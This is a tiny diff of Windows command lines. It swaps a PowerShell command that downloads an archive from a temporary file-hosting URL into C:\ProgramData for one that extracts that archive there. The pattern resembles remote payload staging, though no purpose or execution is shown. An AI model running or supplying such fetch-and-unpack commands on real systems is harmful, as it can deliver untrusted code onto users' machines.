@@ -1,1 +1,1 @@
-cmd.exe /c powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://tmpfiles.org/wFwBA7WFSnMI' -OutFile 'C:\ProgramData\outfile.zip' "
+cmd.exe /c powershell "Expand-Archive -Path 'C:\ProgramData\outfile.zip' -DestinationPath 'C:\ProgramData\unzipped' "
